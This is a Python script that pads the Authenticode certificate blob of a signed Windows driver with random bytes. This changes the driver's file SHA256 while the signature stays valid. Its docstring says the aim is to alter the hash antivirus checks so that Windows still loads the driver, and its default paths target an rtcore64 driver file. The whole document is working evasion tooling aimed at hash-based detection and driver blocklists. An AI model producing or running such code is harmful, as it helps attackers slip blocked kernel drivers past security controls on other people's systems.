#!/usr/bin/env python3 -I
"""
Patch a signed PE driver to change its full-file SHA256 without breaking
the Authenticode signature.

The Authenticode hash computation excludes:
  1. The PE Optional Header checksum field
  2. The Certificate Table DataDirectory entry (RVA + Size, 8 bytes)
  3. The certificate data itself (WIN_CERTIFICATE blob)

Appending random bytes inside the cert region changes the full-file SHA256
(what AV hashes) but leaves the Authenticode-covered hash intact, so
Windows still validates and loads the driver.

Two size fields must be updated to reflect the longer cert:
  - DataDirectory[4].Size  at dd4_off + 4
  - WIN_CERTIFICATE.dwLength at cert_off (first 4 bytes of cert struct)
"""
import struct, os, sys, hashlib


def patch(src_path, dst_path, extra_bytes=64):
    with open(src_path, 'rb') as f:
        data = bytearray(f.read())

    pe_off  = struct.unpack_from('<I', data, 0x3C)[0]
    oh_off  = pe_off + 0x18
    dd4_off = oh_off + 0x70 + 4 * 8        # DataDirectory[4].VirtualAddress

    cert_off  = struct.unpack_from('<I', data, dd4_off)[0]
    cert_size = struct.unpack_from('<I', data, dd4_off + 4)[0]

    assert cert_off + cert_size == len(data), \
        f"cert not at EOF: cert ends at {cert_off+cert_size:#x}, file is {len(data):#x}"

    padding = os.urandom(extra_bytes)
    data += padding
    new_size = cert_size + extra_bytes

    struct.pack_into('<I', data, dd4_off + 4, new_size)
    struct.pack_into('<I', data, cert_off,    new_size)

    with open(dst_path, 'wb') as f:
        f.write(data)

    orig_sha = hashlib.sha256(open(src_path, 'rb').read()).hexdigest()
    new_sha  = hashlib.sha256(bytes(data)).hexdigest()
    print(f"Original SHA256: {orig_sha}")
    print(f"Patched  SHA256: {new_sha}")
    print(f"File size: {len(data) - extra_bytes} -> {len(data)} (+{extra_bytes} bytes)")
    assert orig_sha != new_sha, "SHA256 unchanged — something went wrong"
    print("OK")


if __name__ == '__main__':
    src = sys.argv[1] if len(sys.argv) > 1 else 'drivers/rtcore64_orig.sys'
    dst = sys.argv[2] if len(sys.argv) > 2 else 'drivers/rtcore64_patched.sys'
    patch(src, dst)
